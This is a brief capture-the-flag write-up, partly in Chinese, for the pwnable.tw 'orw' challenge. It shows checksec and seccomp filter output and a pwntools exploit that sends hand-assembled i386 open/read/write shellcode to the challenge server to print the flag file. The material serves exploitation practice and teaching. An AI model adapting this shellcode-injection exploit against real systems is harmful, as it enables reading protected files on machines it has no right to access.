# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

> open("/home/orw/flag") -> read() -> write()

看到prctl，利用seccomp-tools查过滤，发现可以对文件进行操作，直接写shellcode读flag。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./orw.dms')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10001)

addr = 0x0804A060       # bss addr
path = 0x0804A0A0       # file path addr
size = 0x30             # flag length
payload = ''
payload += asm('xor eax, eax; mov al, 5; mov ebx, %d; xor ecx, ecx; xor edx, edx; int 0x80;' % path)
payload += asm('mov ebx, eax; xor eax, eax; mov al, 3; mov ecx, %d; xor edx, edx; mov dl, %d; int 0x80;' % (path, size))
payload += asm('xor eax, eax; mov al, 4; xor ebx, ebx; mov bl, 1; mov ecx, %d; xor edx, edx; mov dl, %d; int 0x80;' % (path, size))
payload += 'a' * (path - addr - len(payload)) + '/home/orw/flag\x00'

print payload.encode('hex')

p.recvuntil('shellcode:')

p.sendline(payload)

p.interactive()
```
